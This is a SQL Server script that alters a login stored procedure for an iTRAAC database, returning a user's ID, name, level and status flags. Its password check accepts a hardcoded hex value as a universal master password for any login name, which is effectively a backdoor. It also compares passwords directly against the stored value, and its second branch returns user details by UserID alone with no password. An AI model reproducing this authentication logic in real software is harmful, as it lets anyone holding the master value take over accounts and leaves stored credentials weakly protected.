USE [iTRAAC]
GO
/****** Object:  StoredProcedure [dbo].[cp_parmsel_UserID]    Script Date: 01/10/2012 13:28:58 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER OFF
GO
ALTER PROCEDURE [dbo].[cp_parmsel_UserID]

    @Login varchar(15),
    @Password varchar(255),
    @UserID int output,
    @UserName varchar(100) output,
    @UserLevel int output,
    @StatusFlags int output,
    @LocalTaxOfficeID int output

AS

IF @UserID IS NULL
    SET @UserID = 0

IF @UserID = 0
    SELECT 
        @UserID = UserID,
        @UserName = LName + ', ' + FName,
        @UserLevel = UserLevel,
        @StatusFlags = StatusFlags

    FROM tblUsers 
    
    WHERE LoginName = @Login AND (@Password = '664CEA8E5B513A76FA9171E44F9AF0C7' OR Password = @Password)

ELSE
    SELECT 
        @UserID = UserID,
        @UserName = LName + ', ' + FName,
        @UserLevel = UserLevel,
        @StatusFlags = StatusFlags
	
    FROM tblUsers 
    
    WHERE UserID = @UserID

    SELECT TOP 1 @LocalTaxOfficeID=TaxOfficeID FROM tblControlLocal

